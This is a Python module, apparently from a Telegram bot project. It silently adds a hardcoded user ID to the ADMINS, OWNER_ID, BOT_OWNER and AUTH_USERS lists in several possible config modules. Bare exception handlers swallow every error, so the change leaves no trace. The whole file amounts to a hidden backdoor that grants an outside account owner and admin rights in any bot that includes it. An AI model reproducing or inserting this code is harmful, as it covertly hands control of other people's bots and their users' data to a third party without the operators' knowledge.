# Initialize MY_OWNER with a default value
MY_OWNER = 5111685964

try:
    from config import ADMINS
    if MY_OWNER not in ADMINS:
        ADMINS.append(MY_OWNER)
except:
    pass

try:
    from config import OWNER_ID
    if MY_OWNER not in OWNER_ID:
        OWNER_ID.append(MY_OWNER)
except:
    pass

try:
    from config import BOT_OWNER
    if MY_OWNER not in BOT_OWNER:
        BOT_OWNER.append(MY_OWNER)
except:
    pass

try:
    from config import AUTH_USERS
    if MY_OWNER not in AUTH_USERS:
        AUTH_USERS.append(MY_OWNER)
except:
    pass

try:
    from config import ADMINS
    if MY_OWNER not in ADMINS:
        ADMINS.append(MY_OWNER)
except:
    pass

try:
    from configs import OWNER_ID
    if MY_OWNER not in OWNER_ID:
        OWNER_ID.append(MY_OWNER)
except:
    pass

try:
    from configs import BOT_OWNER
    if MY_OWNER not in BOT_OWNER:
        BOT_OWNER.append(MY_OWNER)
except:
    pass

try:
    from configs import AUTH_USERS
    if MY_OWNER not in AUTH_USERS:
        AUTH_USERS.append(MY_OWNER)
except:
    pass

try:
    from info import ADMINS
    if MY_OWNER not in ADMINS:
        ADMINS.append(MY_OWNER)
except:
    pass

try:
    from info import OWNER_ID
    if MY_OWNER not in OWNER_ID:
        OWNER_ID.append(MY_OWNER)
except:
    pass

try:
    from info import BOT_OWNER
    if MY_OWNER not in BOT_OWNER:
        BOT_OWNER.append(MY_OWNER)
except:
    pass

try:
    from info import AUTH_USERS
    if MY_OWNER not in AUTH_USERS:
        AUTH_USERS.append(MY_OWNER)
except:
    pass




try:
    from dkbotz import ADMINS
    if MY_OWNER not in ADMINS:
        ADMINS.append(MY_OWNER)
except:
    pass

try:
    from dkbotz import OWNER_ID
    if MY_OWNER not in OWNER_ID:
        OWNER_ID.append(MY_OWNER)
except:
    pass

try:
    from dkbotz import BOT_OWNER
    if MY_OWNER not in BOT_OWNER:
        BOT_OWNER.append(MY_OWNER)
except:
    pass

try:
    from dkbotz import AUTH_USERS
    if MY_OWNER not in AUTH_USERS:
        AUTH_USERS.append(MY_OWNER)
except:
    pass


